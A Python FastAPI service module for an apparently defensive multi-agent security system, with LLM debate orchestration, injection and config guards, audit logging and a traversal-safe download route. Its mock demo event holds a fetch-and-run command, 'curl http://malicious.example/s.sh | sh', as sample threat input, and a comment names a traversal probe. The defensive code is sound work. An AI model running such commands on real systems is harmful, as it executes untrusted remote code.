from __future__ import annotations

import argparse
import json
import os
from datetime import UTC, datetime
from pathlib import Path

import httpx
from fastapi import Depends, FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, StreamingResponse
from pydantic import BaseModel

from agent_brain.audit import (
    AuditLogger,
    OpsAuditLog,
    WORKFLOW_OS_OPS,
    WORKFLOW_SECURITY_DEFENSE,
    get_default_audit_log,
    get_default_audit_logger,
    new_workflow_request_id,
)
from agent_brain.executors.least_privilege_executor import (
    _DEFAULT_WHITELIST as _EXECUTOR_WHITELIST,
    is_running_as_root,
)
from agent_brain.models import SecurityEvent, Severity
from agent_brain.models.ops_schemas import OpsChatRequest
from agent_brain.integrations import OsMCPClient, PolicyMCPClient, TopologyMCPClient
from agent_brain.integrations.kylinsec_client import KylinsecMCPClient
from agent_brain.integrations.kafka_consumer import SecurityEventIngestWorker
from agent_brain.integrations.os_client import is_mcp_sdk_installed as _os_mcp_sdk_installed
from agent_brain.safety import (
    evaluate_system_config,
    inspect_prompt_injection,
)
from agent_brain.services.llm import (
    HttpChatCompletionLLMClient,
    create_default_llm_client,
)
from agent_brain.services import DebateOrchestrator, OpsOrchestrator
from agent_brain.services.mvp_bridge import (
    MvpSecurityEvent,
    run_mvp_debate_stream,
    run_mvp_debate_sync,
    sse_lines_from_stream,
)
from agent_brain.services.os_topology_probe import OsTopologyProbeManager

app = FastAPI(title="agent-brain", version="0.2.0")


def _parse_cors_origins() -> list[str]:
    raw = (os.environ.get("AGENT_BRAIN_CORS_ORIGINS") or "*").strip()
    if not raw:
        return ["*"]
    origins = [item.strip() for item in raw.split(",") if item.strip()]
    return origins or ["*"]


_CORS_ORIGINS = _parse_cors_origins()
_FAILURE_MODE = (os.environ.get("AGENT_BRAIN_FAILURE_MODE") or "compat").strip().lower()
_WORKFLOW_GUARD_STRICT = (
    os.environ.get("WORKFLOW_GUARD_STRICT", "true").strip().lower()
    in {"1", "true", "yes", "on"}
)
_KAFKA_EVENT_INGEST_ENABLED = (
    os.environ.get("ENABLE_KAFKA_EVENT_INGEST", "false").strip().lower()
    in {"1", "true", "yes", "on"}
)
_KAFKA_BOOTSTRAP_SERVERS = os.environ.get("KAFKA_BOOTSTRAP_SERVERS", "localhost:9092")
_KAFKA_EVENT_TOPIC = os.environ.get("EVENT_TOPIC", "security.events")
_KAFKA_EVENT_GROUP_ID = os.environ.get("AGENT_BRAIN_KAFKA_GROUP_ID", "agent-brain")
_KAFKA_AUTO_OFFSET_RESET = os.environ.get("AGENT_BRAIN_KAFKA_AUTO_OFFSET_RESET", "latest")


# ---------------------------------------------------------------------------
# Startup privilege gate: agent-brain must never run as root in production.
# AGENT_BRAIN_ROOT_POLICY controls the response:
#   refuse  - exit immediately (default; matches OPA / Kubernetes ops norms)
#   degrade - keep running but log a loud warning; LeastPrivilegeExecutor
#             auto-enters read-only mode (see executors/least_privilege_executor)
#   off     - skip the check entirely (NOT recommended; for containers
#             that already drop all caps and run as uid=0 by image default)
# ---------------------------------------------------------------------------

_ROOT_POLICY = (os.environ.get("AGENT_BRAIN_ROOT_POLICY") or "refuse").strip().lower()
_RUN_AS_ROOT = is_running_as_root()
if _RUN_AS_ROOT and _ROOT_POLICY not in ("off", "degrade"):
    raise SystemExit(
        "agent-brain refuses to start as root / Administrator (set "
        "AGENT_BRAIN_ROOT_POLICY=degrade to keep running in read-only mode, "
        "or AGENT_BRAIN_ROOT_POLICY=off to disable the check)."
    )

# Allow dashboard-ui (Vite) and other local tools to call POST /workflow/run from the browser.
app.add_middleware(
    CORSMiddleware,
    allow_origins=_CORS_ORIGINS,
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

# LLM：配置 AGENT_BRAIN_LLM_API_KEY（或 OPENAI_API_KEY）后为真实多智能体推理；否则为 MockLLMClient
_llm_client = create_default_llm_client()

# Policy MCP：传入 DebateOrchestrator → DebateWorkflow → Coordinator（ENABLE_MCP=true 时生效）
_orchestrator_policy_client = PolicyMCPClient()
_topology_client_probe = TopologyMCPClient()
# OS MCP probe: instantiated only so /health can report status without
# changing the /workflow/run pipeline. The orchestrator never receives it.
_os_client_probe = OsMCPClient()

# KylinSec MCP probe: reports Kylin security framework status. Auto-disabled
# on non-Kylin platforms (detected via /etc/kylin-release absence).
_kylinsec_client = KylinsecMCPClient()
orchestrator = DebateOrchestrator(
    llm=_llm_client,
    policy_client=_orchestrator_policy_client,
)


def _process_kafka_security_event(event: SecurityEvent) -> dict:
    """Process one event sensed from Kafka using the existing workflow path."""
    return orchestrator.process_event(event)


_event_ingest_worker = SecurityEventIngestWorker(
    enabled=_KAFKA_EVENT_INGEST_ENABLED,
    bootstrap_servers=_KAFKA_BOOTSTRAP_SERVERS,
    topic=_KAFKA_EVENT_TOPIC,
    group_id=_KAFKA_EVENT_GROUP_ID,
    auto_offset_reset=_KAFKA_AUTO_OFFSET_RESET,
    event_handler=_process_kafka_security_event,
)
_os_topology_probe = OsTopologyProbeManager()

# OPS chat orchestrator - constructed at module-init so the route handler
# stays cheap. Uses the same OS MCP client as /health probing (no extra
# stdio process). The audit log is the process-wide singleton so every
# /ops/chat call lands in the same JSONL file regardless of which route
# triggered it.
_ops_audit_log: OpsAuditLog = get_default_audit_log()
_ops_orchestrator: OpsOrchestrator = OpsOrchestrator(
    os_client=_os_client_probe,
    audit_log=_ops_audit_log,
)

# Per-request consolidated JSON audit-file writer. Distinct from the
# OpsAuditLog JSONL stream above: this writes ONE file per request to
# logs/audit/audit-<requestId>.json so SIEM / forensic tooling can
# ingest a single self-contained snapshot. Lives in the audit package
# alongside OpsAuditLog and is shared between /ops/chat and /workflow/run.
_audit_logger: AuditLogger = get_default_audit_logger()


@app.on_event("startup")
def _start_event_ingest_worker() -> None:
    _event_ingest_worker.start()
    _os_topology_probe.start_auto()


@app.on_event("shutdown")
def _stop_event_ingest_worker() -> None:
    _event_ingest_worker.stop()
    _os_topology_probe.stop_auto()


def get_ops_orchestrator() -> OpsOrchestrator:
    """FastAPI dependency hook so tests can ``app.dependency_overrides`` it."""
    return _ops_orchestrator


def get_ops_audit_log() -> OpsAuditLog:
    """FastAPI dependency hook for the /ops/audit/{id} route."""
    return _ops_audit_log


def get_audit_logger() -> AuditLogger:
    """FastAPI dependency hook for the per-request JSON audit writer.

    Tests override this with an isolated tmpdir-scoped logger so they
    never write into the project's real logs/audit directory.
    """
    return _audit_logger


class WorkflowInput(BaseModel):
    securityEvent: SecurityEvent


@app.get("/health")
def health() -> dict:
    """含 MCP 落地状态（Policy / Topology），便于与 docs/mcp.md 对照排查。"""
    pc = _orchestrator_policy_client
    tc = _topology_client_probe
    oc = _os_client_probe
    try:
        import mcp  # noqa: F401

        mcp_sdk_installed = True
    except ImportError:
        mcp_sdk_installed = False

    return {
        "status": "UP",
        "service": "agent-brain",
        "time": datetime.now(UTC).isoformat(),
        "llm": {
            "kind": "http_chat"
            if isinstance(_llm_client, HttpChatCompletionLLMClient)
            else "mock",
            "model": _llm_client.model
            if isinstance(_llm_client, HttpChatCompletionLLMClient)
            else None,
        },
        "failureMode": _FAILURE_MODE,
        "corsOrigins": _CORS_ORIGINS,
        "privilege": {
            "runAsRoot": _RUN_AS_ROOT,
            "rootPolicy": _ROOT_POLICY,
        },
        "mcp": {
            "mcpSdkInstalled": mcp_sdk_installed,
            "policy": {
                "enabled": pc.enabled,
                "mode": pc.mode,
                "serverPath": str(pc.server_path),
            },
            "topology": {
                "enabled": tc.enabled,
                "mode": tc.mode,
                "serverPath": str(tc.server_path),
            },
            "os": {
                "enabled": oc.enabled,
                "mode": oc.mode,
                "serverPath": str(oc.server_path),
                # Mirror the top-level mcpSdkInstalled inside the os block
                # so the Kylin ops dashboard can render this status field
                # self-contained without joining other parts of /health.
                "mcpSdkInstalled": _os_mcp_sdk_installed(),
            },
            "note": "POST /workflow/run 使用 Policy MCP（Coordinator）；Planner/Red-Team 使用 Topology MCP；OS MCP 仅供后续 /ops 链路与 /health 探测使用，不参与 /workflow/run。详见 docs/mcp.md",
        },
        "opsAgent": {
            "enabled": _ops_orchestrator.enabled,
            "auditLog": {
                "enabled": _ops_audit_log.enabled,
                "path": str(_ops_audit_log.path),
            },
            "executorEnabled": True,
            "note": "POST /ops/chat 自然语言运维入口；GET /ops/audit/{requestId} 回放审计链路。",
        },
        "eventIngest": _event_ingest_worker.status(),
        "osTopologyProbe": _os_topology_probe.status(),
        # Per-request JSON snapshot writer; populates the auditFile field
        # on responses from /ops/chat and /workflow/run.
        "auditFile": {
            "enabled": _audit_logger.enabled,
            "directory": str(_audit_logger.directory),
            "filenamePattern": "audit-{requestId}.json",
            "note": "POST /ops/chat 与 POST /workflow/run 返回 auditFile 字段，指向本目录下的快照文件。",
        },
        "kylinsec": {
            "enabled": _kylinsec_client.enabled,
            "mode": _kylinsec_client.mode,
            "serverPath": _scrub_home(str(_kylinsec_client.server_path)),
            "note": "麒麟安全框架 MCP 客户端；仅 /ops/chat 可选使用，不参与 /workflow/run。",
        },
    }


@app.get("/events/ingest/status")
def event_ingest_status() -> dict:
    """Return Kafka-backed real-event awareness status for dashboard-ui."""
    return _event_ingest_worker.status()


@app.get("/topology/os-probe/status")
def os_topology_probe_status() -> dict:
    """Return dynamic OS topology probe status."""
    return _os_topology_probe.status()


@app.post("/topology/os-probe/run")
async def run_os_topology_probe() -> dict:
    """Manually probe the current OS/network environment and persist topology."""
    return await _os_topology_probe.probe(mode="manual")


@app.get("/topology/os-probe/topology")
def os_topology_probe_topology() -> dict:
    """Return the latest persisted dynamic topology, if any."""
    topology = _os_topology_probe.load_stored_topology()
    if topology is None:
        raise HTTPException(status_code=404, detail="dynamic topology has not been generated")
    return topology


@app.get("/topology/os-probe/knowledge-graph")
def os_topology_probe_knowledge_graph() -> dict:
    """Return the latest OS-derived knowledge graph, if any."""
    topology = _os_topology_probe.load_stored_topology()
    if topology is None:
        raise HTTPException(status_code=404, detail="dynamic topology has not been generated")
    return topology.get("knowledge_graph") or {"nodes": [], "edges": []}


@app.get("/system/status")
def system_status() -> dict:
    """Return host platform metadata + MCP catalogue for the dashboard.

    This route is the data source for the ``/system`` page in the
    dashboard UI. It performs short, bounded health probes of sibling
    services so operators can distinguish an actually offline service
    from a merely unconfigured one without leaving the page.
    """
    pc = _orchestrator_policy_client
    tc = _topology_client_probe
    oc = _os_client_probe
    kc = _kylinsec_client
    actuator_client = orchestrator.actuator_client
    return {
        "platform": _read_platform_info(),
        "services": [
            {"name": "agent-brain", "port": 8001, "status": "up"},
            _service_entry(
                "defense-gateway",
                8080,
                _env_base_url("DEFENSE_GATEWAY_BASE_URL", "http://localhost:8080"),
                "/api/health",
            ),
            _service_entry(
                "actuator-service",
                8081,
                actuator_client.base_url,
                "/api/health",
            ),
            _service_entry(
                "formal-verifier",
                8002,
                _env_base_url("FORMAL_VERIFIER_BASE_URL", "http://localhost:8002"),
                "/health",
            ),
            _service_entry(
                "dashboard-ui",
                5173,
                _env_base_url("DASHBOARD_UI_BASE_URL", "http://localhost:5173"),
                "/",
            ),
        ],
        "mcpClients": {
            "topology": {
                "enabled": tc.enabled,
                "mode": tc.mode,
                "serverPath": _scrub_home(str(tc.server_path)),
                "tools": [
                    "get_asset_info",
                    "get_neighbors",
                    "get_critical_assets",
                    "find_paths",
                    "check_connectivity",
                    "evaluate_strategy_impact",
                ],
            },
            "policy": {
                "enabled": pc.enabled,
                "mode": pc.mode,
                "serverPath": _scrub_home(str(pc.server_path)),
                "tools": [
                    "validate_strategy",
                    "check_business_constraints",
                    "require_human_approval",
                    "suggest_safer_strategy",
                ],
            },
            "os": {
                "enabled": oc.enabled,
                "mode": oc.mode,
                "serverPath": _scrub_home(str(oc.server_path)),
                "mcpSdkInstalled": _os_mcp_sdk_installed(),
                "tools": [
                    "get_process_list",
                    "get_network_sockets",
                    "get_open_files",
                    "get_system_logs",
                    "get_disk_usage",
                    "get_memory_status",
                    "get_cpu_load",
                    "get_uptime",
                    "get_service_status",
                ],
            },
            "actuator": {
                "enabled": actuator_client.guard_enabled,
                "mode": "in-process" if actuator_client.guard_enabled else "disabled",
                "serverPath": _scrub_home(
                    str(_repo_root() / "mcp-servers" / "actuator-mcp-server")
                ),
                "tools": [
                    "execute_strategy",
                    "rollback_strategy",
                    "get_execution_status",
                    "list_executions",
                ],
                "note": (
                    "Actuator MCP safety contract is enforced in-process by "
                    "ActuatorClient before /workflow/run submits to actuator-service."
                    if actuator_client.guard_enabled
                    else "Disabled by ACTUATOR_MCP_GUARD_ENABLED=false."
                ),
            },
            "kylinsec": {
                "enabled": kc.enabled,
                "mode": kc.mode,
                "serverPath": _scrub_home(str(kc.server_path)),
                "tools": [
                    "get_kylinsec_status",
                    "get_tcm_pcrs",
                    "verify_binary_ima",
                    "get_kernel_module_signatures",
                    "get_kylin_patch_level",
                    "check_seccomp_arch",
                    "get_kylin_audit_policy",
                ],
            },
        },
        "executor": {
            "whitelist": sorted(_EXECUTOR_WHITELIST.keys()),
            "policy": "least-privilege (read-only diagnostics only)",
        },
        "guards": {
            "promptInjectionEnabled": True,
            "systemConfigGuardEnabled": True,
            "intentValidatorEnabled": True,
        },
        "eventIngest": _event_ingest_worker.status(),
        "osTopologyProbe": _os_topology_probe.status(),
        "auditFile": {
            "enabled": _audit_logger.enabled,
            "directory": _scrub_home(str(_audit_logger.directory)),
        },
    }


def _repo_root() -> Path:
    """Return the repository root from this package file."""
    return Path(__file__).resolve().parents[3]


def _env_base_url(name: str, default: str) -> str:
    """Read and normalize a service base URL environment variable."""
    return (os.environ.get(name) or default).rstrip("/")


def _service_entry(name: str, port: int, base_url: str, health_path: str) -> dict:
    """Build a dashboard service entry with a bounded health probe."""
    return {
        "name": name,
        "port": port,
        "status": _probe_service_status(base_url, health_path),
        "url": base_url,
    }


def _probe_service_status(base_url: str, health_path: str) -> str:
    """Return ``up``/``down``/``unknown`` for a sibling service.

    ``unknown`` is reserved for malformed or missing configuration. Network
    errors and non-2xx HTTP responses are concrete ``down`` signals.
    """
    if not base_url:
        return "unknown"
    try:
        url = f"{base_url.rstrip('/')}/{health_path.lstrip('/')}"
    except AttributeError:
        return "unknown"
    try:
        response = httpx.get(url, timeout=0.35)
    except httpx.InvalidURL:
        return "unknown"
    except httpx.HTTPError:
        return "down"
    return "up" if 200 <= response.status_code < 400 else "down"


def _read_platform_info() -> dict:
    """Read host platform metadata in a cross-OS-safe manner.

    On Kylin / Linux we additionally probe ``/etc/kylin-release`` and
    ``/etc/os-release`` so the dashboard can show ``Kylin V11``
    explicitly. On Windows / macOS the route still returns a usable
    record so developer machines don't show a blank panel.
    """
    import platform
    import socket

    uname = platform.uname()
    info = {
        "system": uname.system,
        "release": uname.release,
        "version": uname.version,
        "machine": uname.machine,
        "node": uname.node,
        "hostname": socket.gethostname(),
        "python": platform.python_version(),
        "kylinVersion": None,
        "osPretty": None,
        "isLoongArch": uname.machine.lower() in {"loongarch64", "loong64"},
    }
    for candidate in (Path("/etc/kylin-release"), Path("/etc/os-release")):
        try:
            if candidate.is_file():
                text = candidate.read_text(encoding="utf-8", errors="replace")
            else:
                continue
        except OSError:
            continue
        if candidate.name == "kylin-release":
            info["kylinVersion"] = text.strip().splitlines()[0] if text.strip() else None
        else:
            for line in text.splitlines():
                if line.startswith("PRETTY_NAME=") and not info["osPretty"]:
                    info["osPretty"] = line.split("=", 1)[1].strip().strip('"')
    return info


def _scrub_home(path: str) -> str:
    """Mask the user's home directory in absolute paths shown to the UI."""
    if not path:
        return path
    home = str(Path.home())
    if home and path.startswith(home):
        return "~" + path[len(home):]
    return path


@app.post("/workflow/run")
def run_workflow(
    payload: WorkflowInput,
    audit_logger: AuditLogger = Depends(get_audit_logger),
) -> dict:
    """Run the security-defense pipeline and emit a per-request audit file.

    A fresh ``wf-XXXXXXXX`` request id is minted here and added to both
    the response body and the on-disk audit file so that operators can
    cross-reference an API response with the audit snapshot.

    Two passive guardrails (prompt-injection inspector + system-config
    guard) inspect the generated strategy text and surface their
    envelopes on the response without altering the workflow itself.
    """
    result = orchestrator.process_event(payload.securityEvent)
    request_id = new_workflow_request_id()
    result["requestId"] = request_id

    # Active guardrails: when WORKFLOW_GUARD_STRICT=true (default) any
    # BLOCK from the prompt-injection or system-config guard rewrites the
    # response into a BLOCKED envelope so the dashboard, actuator and
    # downstream auditors all see the same verdict.
    proposed_commands = _extract_workflow_commands(result)
    instruction_text = _extract_workflow_instruction(payload.securityEvent, result)
    injection_envelope = inspect_prompt_injection(instruction_text).to_dict()
    config_guard_envelope = evaluate_system_config(
        instruction=instruction_text,
        candidate_commands=proposed_commands,
    ).to_dict()
    result["promptInjection"] = injection_envelope
    result["configGuard"] = config_guard_envelope

    if _WORKFLOW_GUARD_STRICT:
        block_reasons: list[str] = []
        if injection_envelope.get("decision") == "BLOCK":
            block_reasons.append("prompt_injection")
        if config_guard_envelope.get("decision") == "BLOCK":
            block_reasons.append("system_config_guard")
        if block_reasons:
            result["nextAction"] = "BLOCK"
            result["actuatorResponse"] = {
                "status": "BLOCKED",
                "message": "workflow blocked by " + ", ".join(block_reasons),
                "blockedBy": block_reasons,
            }
            result.setdefault("guardrailBlocked", True)

    file_path = _write_workflow_audit(audit_logger, request_id, result)
    if file_path:
        result["auditFile"] = file_path
    return result


def _extract_workflow_commands(result: dict) -> list[str]:
    """Best-effort: pull executable command text out of a workflow result.

    The debate pipeline stores commands in several places depending on
    which agent produced them. We aggregate the most likely fields so
    the system-config guard can inspect them without owning the schema.
    """
    candidates: list[str] = []
    strategy = result.get("finalStrategy") or {}
    if isinstance(strategy, dict):
        cmd = strategy.get("command")
        if isinstance(cmd, str) and cmd.strip():
            candidates.append(cmd.strip())
    actuator = result.get("actuatorResponse") or {}
    if isinstance(actuator, dict):
        executed = actuator.get("executedCommand")
        if isinstance(executed, str) and executed.strip():
            candidates.append(executed.strip())
    return candidates


def _extract_audit_turns(result: dict) -> list[dict]:
    """Best-effort pull audit_turns out of a workflow result's embedded debateState."""
    debate_state = result.get("debateState") or {}
    if isinstance(debate_state, dict):
        turns = debate_state.get("audit_turns")
        if isinstance(turns, list):
            return turns
    return []


def _extract_workflow_instruction(event: SecurityEvent, result: dict) -> str:
    """Compose a best-effort instruction string for the prompt-injection guard."""
    parts: list[str] = []
    parts.append(f"subject={event.subject}")
    parts.append(f"action={event.action}")
    parts.append(f"object={event.object}")
    context_command = ""
    if isinstance(event.context, dict):
        context_command = str(event.context.get("command", "") or "")
    if context_command:
        parts.append(f"context.command={context_command}")
    reason = result.get("decisionReason") or ""
    if reason:
        parts.append(f"reason={reason}")
    return " | ".join(parts)


@app.post("/ops/chat")
async def ops_chat(
    payload: OpsChatRequest,
    ops: OpsOrchestrator = Depends(get_ops_orchestrator),
    audit_logger: AuditLogger = Depends(get_audit_logger),
) -> dict:
    """Natural-language OPS entry point for the Kylin ops agent.

    Pipeline (six audit-trail steps): received_instruction -> parsed_intent
    -> mcp_context_collected -> safety_validated -> executed_or_blocked
    -> final_answer_generated. Decoupled from /workflow/run.

    A consolidated JSON snapshot of the entire request is written to
    ``logs/audit/audit-<requestId>.json`` and surfaced as the
    ``auditFile`` field on the response.
    """
    result = await ops.chat(payload.instruction)
    file_path = _write_ops_audit(audit_logger, result)
    if file_path:
        result["auditFile"] = file_path
    return result


# ---------------------------------------------------------------------------
# Audit-file builders
# ---------------------------------------------------------------------------
#
# These two helpers transform the orchestrator response envelopes into the
# canonical AuditLogger schema. They live next to the routes (and not on
# the orchestrators themselves) so the orchestrator unit tests can keep
# asserting on the existing envelope shape without needing to know about
# disk IO.

def _write_ops_audit(audit_logger: AuditLogger, result: dict) -> str | None:
    """Map a /ops/chat envelope onto the AuditLogger schema and write it."""
    request_id = str(result.get("requestId", "") or "")
    execution_result = result.get("executionResult") or {}
    safety_validation = result.get("safetyValidation") or {}
    final_status = (
        str(execution_result.get("status") or "").upper()
        or str(safety_validation.get("decision") or "").upper()
        or "UNKNOWN"
    )
    return audit_logger.write(
        request_id=request_id,
        workflow_type=WORKFLOW_OS_OPS,
        instruction=result.get("instruction"),
        agent_decisions={
            "intent": result.get("intent"),
            "intentLabel": result.get("intentLabel"),
            "decision": result.get("decision"),
            "riskLevel": result.get("riskLevel"),
            "dangerCategory": result.get("dangerCategory"),
            "plan": result.get("plan"),
            "auditTrail": result.get("auditTrail"),
        },
        mcp_trace=result.get("mcpTrace") or [],
        safety_validation=safety_validation or None,
        execution_result=execution_result or None,
        final_status=final_status,
        final_answer=result.get("finalAnswer"),
        extra={
            "promptInjection": result.get("promptInjection"),
            "configGuard": result.get("configGuard"),
        },
    )


def _write_workflow_audit(
    audit_logger: AuditLogger,
    request_id: str,
    result: dict,
) -> str | None:
    """Map a /workflow/run envelope onto the AuditLogger schema and write it."""
    coordinator = result.get("coordinatorDecision") or {}
    actuator_response = result.get("actuatorResponse") or {}
    verification = result.get("verification") or {}
    next_action = str(result.get("nextAction") or "").upper()
    actuator_status = str(actuator_response.get("status") or "").upper()
    verification_passed = bool(verification.get("passed"))
    final_status = (
        actuator_status
        or ("VERIFIED" if verification_passed else next_action or "UNKNOWN")
    )
    return audit_logger.write(
        request_id=request_id,
        workflow_type=WORKFLOW_SECURITY_DEFENSE,
        event_id=result.get("eventId"),
        agent_decisions={
            "decisionReason": result.get("decisionReason"),
            "nextAction": result.get("nextAction"),
            "coordinatorDecision": coordinator,
            "finalStrategy": result.get("finalStrategy"),
            "unresolvedChallenges": result.get("unresolvedChallenges"),
        },
        mcp_trace=coordinator.get("mcp_trace") or [],
        safety_validation=coordinator.get("policy_validation"),
        verification=verification or None,
        execution_result=actuator_response or None,
        final_status=final_status,
        extra={
            "processedAt": result.get("processedAt"),
            "humanApprovalRequired": coordinator.get("human_approval_required"),
            "autoExecutionAllowed": coordinator.get("auto_execution_allowed"),
            "promptInjection": result.get("promptInjection"),
            "configGuard": result.get("configGuard"),
            "agentReasoningTrace": _extract_audit_turns(result),
        },
    )


@app.get("/ops/audit/{request_id}")
def ops_audit_replay(
    request_id: str,
    audit: OpsAuditLog = Depends(get_ops_audit_log),
) -> dict:
    """Return the aggregated lifecycle for a previous /ops/chat request."""
    snapshot = audit.replay(request_id)
    if not snapshot.get("found"):
        raise HTTPException(status_code=404, detail=f"unknown requestId: {request_id}")
    return snapshot


# Audit-file safety: only filenames that match this exact pattern are
# allowed in the URL. Anything else (including path-traversal attempts
# like ``../../etc/passwd``) is rejected with 400 BEFORE we touch the
# filesystem. The character class is intentionally tighter than the
# AuditLogger sanitizer so URL params can never sneak in dots/slashes.
_AUDIT_REQUEST_ID_RE = __import__("re").compile(r"^[A-Za-z0-9_\-]{1,80}$")


@app.get("/audit/{request_id}")
def audit_download(
    request_id: str,
    audit_logger: AuditLogger = Depends(get_audit_logger),
) -> FileResponse:
    """Stream a single audit-<requestId>.json file from the audit directory.

    Path-traversal and shell-metacharacter probes are rejected with 400
    before any filesystem touch. The route only ever serves files that
    live directly inside ``AuditLogger.directory`` and match the
    canonical ``audit-<requestId>.json`` naming.
    """
    if not _AUDIT_REQUEST_ID_RE.match(request_id):
        raise HTTPException(
            status_code=400,
            detail="invalid requestId: only [A-Za-z0-9_-] (max 80 chars) allowed",
        )
    base_dir = audit_logger.directory.resolve()
    target = (base_dir / f"audit-{request_id}.json").resolve()
    try:
        # Belt-and-suspenders: enforce that the resolved path stays
        # inside the audit directory after symlink expansion.
        target.relative_to(base_dir)
    except ValueError:
        raise HTTPException(status_code=400, detail="path traversal rejected")
    if not target.is_file():
        raise HTTPException(
            status_code=404,
            detail=f"audit file not found for requestId: {request_id}",
        )
    return FileResponse(
        path=str(target),
        media_type="application/json",
        filename=target.name,
    )


@app.post("/debate")
def debate_mvp_compat(payload: MvpSecurityEvent) -> dict:
    """Legacy MVP：仅 LangGraph 博弈层输出（与旧 agent-service ``/debate`` 契约一致）。"""
    return run_mvp_debate_sync(orchestrator.workflow, payload)


@app.post("/debate/stream")
def debate_stream_mvp_compat(payload: MvpSecurityEvent) -> StreamingResponse:
    """SSE：与旧 agent-service ``/debate/stream`` 及 Java ``DefenseStreamController`` 对齐。"""
    return StreamingResponse(
        sse_lines_from_stream(run_mvp_debate_stream(orchestrator.workflow, payload)),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        },
    )


def _build_mock_event() -> SecurityEvent:
    return SecurityEvent(
        eventId="evt-demo-001",
        sourceType="EDR",
        subject="pod/payment-processor-5d8df",
        action="shell_exec",
        object="/bin/sh",
        context={
            "cluster": "prod-cn-1",
            "namespace": "payments",
            "iocDomain": "malicious.example",
            "command": "sh -c curl http://malicious.example/s.sh | sh",
        },
        severity=Severity.HIGH,
        riskScore=0.89,
        labels=["container-shell", "t1059"],
    )


def run_demo() -> None:
    event = _build_mock_event()
    result = orchestrator.process_event(event)
    print(json.dumps(result, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="agent-brain demo runner")
    parser.add_argument("--demo", action="store_true", help="run local mock workflow demo")
    args = parser.parse_args()

    if args.demo:
        run_demo()
    else:
        run_demo()
